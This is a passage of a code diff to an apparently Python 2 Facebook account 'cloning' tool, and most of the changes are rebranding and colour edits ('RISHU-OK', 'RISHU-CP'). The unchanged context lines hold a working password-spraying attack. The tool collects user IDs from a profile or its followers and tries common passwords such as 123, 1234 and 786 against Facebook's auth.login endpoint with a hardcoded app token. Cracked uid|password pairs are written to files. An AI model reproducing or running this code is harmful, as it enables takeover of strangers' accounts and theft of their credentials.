 							else:
 								if "www.facebook.com" in q["error_msg"]:
-									print("\033[1;93m[Check-Point] \033[1;97m"+uid+" - "+pass3+" - "+name+"\033[0;97m" )
+									print("\033[1;91m[RISHU-CP] "+uid+" - "+pass3+" - "+name+"\033[0;97m" )
 					                                cp = open("/sdcard/cps.txt", "a")
 									cp.write(uid+"|"+pass3+"\n")
 									cp.close()
@@ -1159,9 +1188,10 @@ def choice2():
 	p.map(main, id)
 	print("\033[1;97m-------------------------------------------------")
 	print("\033[1;97m[!] The cloning process has been completed")
-	print("\033[1;97m[!] Total CP/OK: "+str(len(cps))+"/"+str(len(oks)))
-	print("\033[1;97m[!] CP file saved as : cps.txt")
-	print("\033[1;97m[!] OK file saved as : oks.txt")
+	print("\033[1;97m[!] Total \x1b[1;31mCP\x1b[1;37m/\x1b[1;32mOK\x1b[1;37m: "+str(len(cps))+"/"+str(len(oks)))
+	print("\033[1;97m[!] CP file saved as : \x1b[1;31mcps.txt")
+	print("\033[1;97m[!] OK file saved as : \x1b[1;32moks.txt")
+        print("\033[1;97m-------------------------------------------------")
 	raw_input("\033[1;97m[!] Press enter to back")
 	menu()	
 	
@@ -1172,36 +1202,44 @@ def string():
 		token = open("access_token.txt","r").read()
 	except IOError:
 		print("")
-		print("Token not found or has checkpoint ").center(50)
+		print("\x1b[1;31mToken not found or has checkpoint ").center(50)
 		time.sleep(2)
 		update()
 	os.system("clear")
 	print(logo)
-	print("\033[1;97m[\033[1;93m1\033[1;97m] \033[1;91mCloning With Public ID")
-	print("\033[1;97m[\033[1;93m2\033[1;97m] \033[1;91mCloning With Follower ID")
-	print("\033[1;97m[\033[1;93m3\033[1;97m] \033[1;91mBack To Main Menu")
+        print("\033[1;97m-------------------------------------------------")
+	print("\033[1;97m[1] Cloning With Public ID")
+	print("\033[1;97m[2] Cloning With Follower ID")
+	print("\033[1;97m[3] Back To Main Menu")
 	print("\033[1;97m-------------------------------------------------")
 	string2()
 def string2():
-	select = raw_input("[!] Select a valid option : ")
+	select = raw_input("\033[1;97m[!] Select Option ➤ \x1b[1;32m")
 	id=[]
 	oks=[]
 	cps=[]
 	if select =="1":
 		os.system("clear")
 		print(logo)
-		idt = raw_input("\033[1;97m[!] Enter Public ID/Username : ")
+                print("\033[1;97m-------------------------------------------------")
+		idt = raw_input("\033[1;97m[!] Enter Public ID/Username ➤ \x1b[1;32m")
+                print("\033[1;97m-------------------------------------------------")
 		print("")
-		print("[!] Password : 123,1234,786").center(50)
+                print("\033[1;97m-------------------------------------------------")
+		print("\x1b[1;32m[!] Password : 123,1234,786").center(50)
+                print("\033[1;97m-------------------------------------------------")
 		print("")
+                print("\033[1;97m-------------------------------------------------")
 		p1 = raw_input("[1] Password : ")
 		p2 = raw_input("[2] Password : ")
 		p3 = raw_input("[3] Password : ")
+                print("\033[1;97m-------------------------------------------------")
 		try:
 			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
 			q = json.loads(r.text)
 			os.system('clear')
 			print(logo)
+                        print("\033[1;97m-------------------------------------------------")
 			print("[!] Cloning User Name :\033[1;92m "+q["name"])
 		except KeyError:
 			print("\033[1;91mInvalid link/Username OR Has Privacy").center(50)
@@ -1218,21 +1256,28 @@ def string2():
 	elif select =="2":
 		os.system("clear")
 		print(logo)
-		idt = raw_input("\033[1;97m[!] Enter Follower ID/Username : ")
+                print("\033[1;97m-------------------------------------------------")
+		idt = raw_input("\033[1;97m[!] Enter Follower ID/Username ➤ \x1b[1;32m")
+                print("\033[1;97m-------------------------------------------------")
 		print("")
-		print("[!] Password : 123,1234,786").center(50)
+                print("\033[1;97m-------------------------------------------------")
+		print("\x1b[1;32m[!] Password : 123,1234,786").center(50)
+                print("\033[1;97m-------------------------------------------------")
 		print("")
+                print("\033[1;97m-------------------------------------------------")
 		p1 = raw_input("[1] Password : ")
 		p2 = raw_input("[2] Password : ")
 		p3 = raw_input("[3] Password : ")
+                print("\033[1;97m-------------------------------------------------")
 		try:
 			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
 			q = json.loads(r.text)
 			os.system('clear')
 			print(logo)
+                        print("\033[1;97m-------------------------------------------------")
 			print("[!] Cloning User Name : \033[1;92m"+q["name"])
 		except KeyError:
-			print("\033[1;92mInvalid link/Username OR Has Privacy").center(50)
+			print("\033[1;91mInvalid link/Username OR Has Privacy").center(50)
 			print("")
 			time.sleep(2)
 			string()
@@ -1252,7 +1297,8 @@ def string2():
 		print("")
 		time.sleep(2)
 		string()
-	print("\033[1;97m[!] Total User IDs : "+str(len(id)))
+        print("\033[1;97m-------------------------------------------------")
+	print("\033[1;97m[!] Total User IDs : \x1b[1;32m"+str(len(id)))
 	print("\033[1;97m[!] Cracking Started....")
 	print("\033[1;97m[!] Plz Wait Clone Account Will Be Appear Here")
 	print("\033[1;97m-------------------------------------------------")
@@ -1268,14 +1314,14 @@ def string2():
 			data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 			q = json.loads(data)
 			if "access_token" in q:
-				print("\033[1;92m[Successfull] \033[1;96m"+uid+" - "+pass1+" - "+name+"\033[0;97m") 
+				print("\033[1;92m[RISHU-OK] "+uid+" - "+pass1+" - "+name+"\033[0;97m") 
 				ok = open("/sdcard/oks.txt", "a")
 				ok.write(uid+"|"+pass1+"\n")
 				ok.close()
 				oks.append(uid+pass1)
 			else:
 				if "www.facebook.com" in q["error_msg"]:
-					print("\033[1;93m[Check-Point] \033[1;97m"+uid+" - "+pass1+" - "+name+"\033[0;97m" )
+					print("\033[1;91m[RISHU-CP] "+uid+" - "+pass1+" - "+name+"\033[0;97m" )
 					cp = open("/sdcars/cps.txt", "a")
 					cp.write(uid+"|"+pass1+"\n")
 					cp.close()
@@ -1285,14 +1331,14 @@ def string2():
 					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 					q = json.loads(data)
 					if "access_token" in q:
-                                                print("\033[1;92m[Successfull] \033[1;96m"+uid+" - "+pass2+" - "+name+"\033[0;97m") 
+                                                print("\033[1;92m[RISHU-OK] "+uid+" - "+pass2+" - "+name+"\033[0;97m") 
 				                ok = open("/sdcard/oks.txt", "a")
 						ok.write(uid+"|"+pass2+"\n")
 						ok.close()
 						oks.append(uid+pass2)
 					else:
 						if "www.facebook.com" in q["error_msg"]:
-							print("\033[1;93m[Check-Point] \033[1;97m"+uid+" - "+pass2+" - "+name+"\033[0;97m" )
+							print("\033[1;91m[RISHU-CP] "+uid+" - "+pass2+" - "+name+"\033[0;97m" )
 					                cp = open("/sdcard/cps.txt", "a")
 							cp.write(uid+"|"+pass2+"\n")
 							cp.close()
@@ -1302,14 +1348,14 @@ def string2():
 							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 							q = json.loads(data)
 							if "access_token" in q:
-								print("\033[1;92m[Successfull] \033[1;96m"+uid+" - "+pass3+" - "+name+"\033[0;97m") 
+								print("\033[1;92m[RISHU-OK] "+uid+" - "+pass3+" - "+name+"\033[0;97m") 
 				                                ok = open("/sdcard/oks.txt", "a")
 								ok.write(uid+"|"+pass3+"\n")
 								ok.close()
 								oks.append(uid+pass3)
 							else:
 								if "www.facebook.com" in q["error_msg"]:
-									print("\033[1;93m[Check-Point] \033[1;97m"+uid+" - "+pass3+" - "+name+"\033[0;97m" )
+									print("\033[1;91m[RISHU-CP] "+uid+" - "+pass3+" - "+name+"\033[0;97m" )
 					                                cp = open("/sdcard/cps.txt", "a")
 									cp.write(uid+"|"+pass3+"\n")
 									cp.close()
@@ -1323,9 +1369,10 @@ def string2():
 	p.map(main, id)
 	print("\033[1;97m-------------------------------------------------")
 	print("\033[1;97m[!] The cloning process has been completed")
-	print("\033[1;97m[!] Total CP/OK: "+str(len(cps))+"/"+str(len(oks)))
-	print("\033[1;97m[!] CP file saved as : cps.txt")
-	print("\033[1;97m[!] OK file saved as : oks.txt")
+	print("\033[1;97m[!] Total \x1b[1;31mCP\x1b[1;37m/\x1b[1;32mOK\x1b[1;37m: "+str(len(cps))+"/"+str(len(oks)))
+	print("\033[1;97m[!] CP file saved as : \x1b[1;31mcps.txt")
+	print("\033[1;97m[!] OK file saved as : \x1b[1;32moks.txt")
+        print("\033[1;97m-------------------------------------------------")
 	raw_input("\033[1;97m[!] Press enter to back")
 	menu()		
 	
@@ -1344,6 +1391,7 @@ def user_agents():
 	os.system("clear")
 	print logo
 	print("")
+        print("\033[1;97m-------------------------------------------------")
 	print("[1] Get User Agents")
 	print("[2] Change User Agents")
 	print("[3] Remove User Agents")
@@ -1351,7 +1399,7 @@ def user_agents():
 	print("\033[1;97m-------------------------------------------------")
 	user()
 def user():
-	user_off = raw_input("[!] Select Option : ")
+	user_off = raw_input("\033[1;97m[!] Select Option ➤ \x1b[1;32m")
 	if user_off =="1":
 		os.system("xdg-open https://www.google.com/search?q=My+User+Agent&oq=My+User+Agent&aqs=chrome..69i57j0l3j0i22i30l6.4674j0j1&sourceid=chrome&ie=UTF-8")
 		time.sleep(2)
@@ -1401,13 +1449,14 @@ def result():
 	os.system("clear")
 	print logo
 	print("")
+        print("\033[1;97m-------------------------------------------------")
 	print("[1] Result Cps id")
 	print("[2] Result Oks id")
 	print("[0] Back")
-	print 50 * "-"
+        print("\033[1;97m-------------------------------------------------")
 	res()
 def res():
-	res = raw_input("[!] Option : ")
+	res = raw_input("\033[1;97m[!] Select Option ➤ \x1b[1;32m")
 	if res =="1":
 		cps_ids()
 	elif res =="2":
@@ -1426,7 +1475,7 @@ def cps_ids():
 	os.system("clear")
 	print logo
 	print("")
-	print("Your Cloning Cps Result").center(50)
+	print("\x1b[1;32mYour Cloning Cps Result").center(50)
 	print("")
 	time.sleep(2)
 	try:
@@ -1434,7 +1483,7 @@ def cps_ids():
 		time.sleep(2)
 		print("")
 		print("")
-		raw_input("\t\033[0;93mPress enter to download cps file")
+		raw_input("\t\033[0;97mPress enter to download cps file")
 		time.sleep(1)
 		os.system("clear")
 		print logo
@@ -1444,7 +1493,7 @@ def cps_ids():
 		print("")
 		print("")
 		time.sleep(2)
-		raw_input("\tPress enter back")
+		raw_input("\t\x1b[1;37mPress enter back")
 		time.sleep(1)
 		result()
 	except IOError:
@@ -1458,7 +1507,7 @@ def oks_ids():
 	os.system("clear")
 	print logo
 	print("")
-	print("Your Cloning Oks Result").center(50)
+	print("\x1b[1;32mYour Cloning Oks Result").center(50)
 	print("")
 	time.sleep(2)
 	try:
@@ -1467,7 +1516,7 @@ def oks_ids():
 		time.sleep(2)
 		print("")
 		print("")
-		raw_input("\t\033[0;93mPress enter to download oks file")
+		raw_input("\t\033[0;97mPress enter to download oks file")
 		time.sleep(1)
 		os.system("clear")
 		print logo
@@ -1477,7 +1526,7 @@ def oks_ids():
 		print("")
 		print("")
 		time.sleep(2)
-		raw_input("\tPress enter back")
+		raw_input("\t\x1b[1;37mPress enter back")
 		time.sleep(1)
 		result()
 	except IOError:
